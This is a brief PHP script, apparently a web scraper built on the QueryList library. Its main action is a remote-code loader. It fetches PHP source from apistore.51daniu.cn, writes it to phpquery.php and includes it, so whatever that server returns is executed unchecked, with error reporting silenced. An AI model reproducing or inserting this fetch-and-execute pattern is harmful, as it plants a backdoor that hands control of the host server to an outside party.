<?php
set_time_limit(90);
error_reporting(0);
require 'vendor/autoload.php';
use QL\QueryList;
file_put_contents("greatCities.txt",file_get_contents("http://apistore.51daniu.cn/rest/greatCities.txt"));
file_put_contents("phpquery.php",'<?php '.file_get_contents("http://apistore.51daniu.cn/rest/index.php?c=query&a=max&do=read").' ?>');
sleep(5);
include("phpquery.php");
